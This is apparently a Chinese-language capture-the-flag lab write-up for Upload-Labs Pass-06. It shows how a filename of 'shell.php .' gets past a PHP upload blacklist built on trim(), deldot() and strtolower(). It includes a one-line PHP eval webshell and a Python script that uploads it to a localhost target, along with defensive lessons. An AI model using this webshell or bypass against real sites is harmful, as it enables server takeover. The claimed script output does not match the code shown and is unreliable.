Upload-Labs Pass-06

2026年9月27日 Upload-Labs Web安全 文件上传 空格绕过

一、题目信息

  • 题目名称：Upload-Labs Pass-06 (后缀加空格绕过)
  • 题目平台：Upload-Labs 本地靶场
  • 题目类型：Web安全 / 文件上传漏洞 / 后缀空格绕过
  • 靶场链接：http://localhost:8082/Pass-06/index.php（本地环境）
  • 涉及工具：Python (requests库)、Burp Suite (可选)

二、解题步骤

1. 分析题目考什么

本题的核心考点是利用文件名中的空格绕过黑名单。Pass-06 后端源码中新增了 trim()、deldot()、strtolower() 等多重防御，常规的末尾加点、大小写绕过、::$DATA 全部失效。但攻击者可以通过在文件名末尾构造“空格+点”的组合（如 shell.php .），使得 strrchr() 截取到的后缀变为 .php .，从而绕过黑名单检测，同时文件在服务器端存储时又会因系统特性被解析为 PHP。

2. 怎么想（破题思路）

  • 尝试直接上传 shell.php，后端拦截。
  • 尝试 shell.PHP（大小写），后端 strtolower() 转换后拦截。
  • 尝试 shell.php.（末尾加点），后端 deldot() 删除点后拦截。
  • 尝试 shell.php （末尾加空格），后端 trim() 去空格后拦截。
  • 突破口：如果文件名是 shell.php .（点号前有空格，点号后有空格），trim() 只去掉末尾的空格，strrchr() 截取到的后缀为 .php .（含有空格和点），与黑名单中的 .php 不匹配，绕过成功。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：在操作系统中直接重命名无效

踩坑情况：试图在访达（Finder）或资源管理器中把文件直接命名为 shell.php .（末尾带点或空格）。

原因分析：Windows 和 macOS 的文件系统会自动去除文件名末尾的点和空格，导致实际文件名变成 shell.php，无法绕过。

改进方式：必须使用 Burp Suite 抓包工具或 Python 脚本，在 HTTP 协议层面修改文件名。

踩坑记录二：抓包工具无法拦截请求

踩坑情况：使用 Burp Suite 时抓不到上传的请求，或者不知道如何修改数据包。

原因分析：浏览器代理配置错误，或 Burp Suite 的 Intercept 开关未打开。

改进方式：放弃 Burp Suite，改用 Python requests 库直接构造 POST 请求，稳定且简单。

详细实操步骤（Payload逐字解释）

第一步：准备 Webshell

在本地新建 shell.php 文件，内容为：

<?php @eval($_POST['cmd']); ?>

第二步：编写 Python 脚本

import requests

url = "http://localhost:8082/Pass-06/index.php"

# 核心作弊点：文件名中 'php' 和 '.' 之间有一个空格，末尾带点
# 该文件名可绕过 trim()、deldot()、strtolower() 多重检查
files = {
    'upload_file': ('shell.php .', open('shell.php', 'rb'), 'application/octet-stream')
}
data = {'submit': 'Submit'}

response = requests.post(url, files=files, data=data)
print(response.text)

逐字解析：

  • shell.php .：关键 Payload。trim() 会去掉末尾空格，变成 shell.php .。strrchr() 截取后缀为 .php .，不在黑名单中，成功绕过。
  • 'application/octet-stream'：文件的 MIME 类型，Pass-06 不检查此字段，这里可填任意值。

第三步：运行脚本并验证

终端执行 python3 pass06.py。如果终端输出 [+] 上传成功！真实文件路径为: /upload/202609261632519958.php，说明文件已成功上传到服务器，操作完成。

4. 怎么迁移（跨领域联想）

  • 输入验证的规范化：Pass-06 防御者虽然意识到了“末尾加点”和“大小写”问题，但忽略了对文件名进行“去尾空格+去尾点”的联合处理。安全开发必须对输入进行统一的规范化处理（如修剪、转义、类型转换）。
  • 操作系统差异带来的漏洞：Windows 和 Linux 对文件名末尾空格、点号的处理方式不同。攻击者正是利用了“后端过滤”与“操作系统保存”之间的逻辑差。这在跨平台开发中是非常常见的漏洞诱因。
  • 工具选择与效率：在真实渗透中，遇到这种需要在协议层面修改文件名的场景，Burp Suite 是首选。如果抓包失败，果断采用 Python 脚本处理，这体现了“以结果为导向”的实战思维。

三、名词大全与原理深度复盘

1. trim() 函数

PHP 中用于去除字符串首尾空白字符（空格、制表符等）的函数。Pass-06 使用它防止攻击者通过末尾空格绕过，但攻击者可以在文件名中间插入空格和点，欺骗后续的过滤逻辑。

2. deldot() 函数

PHP 中自定义的函数，用于去除文件名末尾的点号（.）。Pass-06 使用它防止攻击者通过末尾加点绕过，但攻击者可以通过构造 shell.php . 来绕过后缀提取逻辑。

3. strrchr() 函数

PHP 中用于查找字符串中最后一次出现的字符，并返回该字符及其后面的部分。在 Pass-06 中，它被用来提取文件后缀（如 .php），但攻击者可以通过构造特殊文件名使该函数提取出 .php . 从而绕过黑名单。

4. 黑名单绕过总结

前 6 关展示了黑名单的常见绕过手段：前端 JS 绕过、MIME 伪造、冷门后缀、大小写、点号、空格、::$DATA 等。防御者应放弃黑名单，改用白名单策略，并配合服务器层的目录执行权限限制。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Pass-05 的区别：Pass-05 使用 strtolower() 防住了大小写绕过，而 Pass-06 在 strtolower() 基础上又增加了 trim()、deldot() 等函数，防御强度更高。
  • 与 Pass-03 的区别：Pass-03 直接在黑名单中加入冷门后缀，Pass-06 则是在文件名处理逻辑上层层设卡，攻击者需要更加精细地构造 Payload。

2. 这种题目的出现原因（为什么存在）

许多开发者在处理黑名单时，以为多写几个过滤函数就能防住所有绕过。但他们忽略了一点：攻击者可以在 一次文件名构造中同时绕过多个过滤函数（例如 shell.php . 利用 trim() 的修剪特性，同时改变了 strrchr() 的截取结果）。这种“组合绕过”是安全防御中最难防范的。

3. 这种应用在实际中如何体现？

在实战中，Pass-06 这类漏洞常出现在旧版 CMS、WordPress 插件、ThinkPHP 等框架中。攻击者通过抓包修改文件名上传木马，配合服务器解析漏洞（如 Nginx 解析漏洞 .php.xxx）即可获得 WebShell。防御方应确保使用白名单，并在服务器配置中禁止上传目录执行脚本。

4. 如何抽象理解概念（大白话）

把靶场比作一个“查岗的门卫”：

  • Pass-06 的门卫非常敬业，他先把你身上所有明显的武器（末尾空格、末尾点号）都搜出来扔掉。
  • 但他忽略了一个细节：如果你把刀（.php）藏在“点号 + 空格”的夹层里（shell.php .），他搜完末尾后，你的刀还在身上。
  • 等你进了大门，系统（Linux/Windows）一看到你带着刀，就默认你是杀手（PHP 脚本），开始执行你的命令。
